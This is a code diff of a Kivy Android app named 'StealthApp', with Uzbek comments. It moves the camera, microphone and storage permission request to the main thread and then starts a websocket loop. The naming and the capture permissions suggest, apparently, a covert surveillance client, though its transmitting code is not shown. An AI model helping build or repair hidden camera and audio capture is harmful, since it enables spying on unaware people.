@@ -236,15 +236,6 @@ async def ws_loop():
 # --- RUXSATLAR ---
 def run_loop():
     try:
-        if platform == 'android':
-            from android.permissions import request_permissions, Permission
-            request_permissions([
-                Permission.CAMERA,
-                Permission.RECORD_AUDIO,
-                Permission.INTERNET,
-                Permission.WRITE_EXTERNAL_STORAGE,
-                Permission.READ_EXTERNAL_STORAGE,
-            ])
         loop = asyncio.new_event_loop()
         asyncio.set_event_loop(loop)
         loop.run_until_complete(ws_loop())
@@ -293,9 +284,35 @@ class StealthApp(App):
         layout.add_widget(self.label)
         layout.add_widget(btn)
 
-        threading.Thread(target=run_loop, daemon=True).start()
+        # Ruxsatlarni asosiy threaddan so'rash (pyjnius uchun)
+        if platform == 'android':
+            Clock.schedule_once(self._request_permissions, 0.5)
+        else:
+            threading.Thread(target=run_loop, daemon=True).start()
+
         Clock.schedule_interval(self.update_ui, 1)
         return layout
+
+    def _request_permissions(self, dt):
+        try:
+            from android.permissions import request_permissions, Permission
+            request_permissions(
+                [
+                    Permission.CAMERA,
+                    Permission.RECORD_AUDIO,
+                    Permission.INTERNET,
+                    Permission.WRITE_EXTERNAL_STORAGE,
+                    Permission.READ_EXTERNAL_STORAGE,
+                ],
+                self._on_permissions_result
+            )
+        except Exception as e:
+            status[0] = "Ruxsat xatoligi: " + str(e)[:100]
+            threading.Thread(target=run_loop, daemon=True).start()
+
+    def _on_permissions_result(self, permissions, grants):
+        # Ruxsatlar so'ralgandan so'ng ulanishni boshlash
+        threading.Thread(target=run_loop, daemon=True).start()
 
     def update_ui(self, dt):
         self.label.text = status[0]
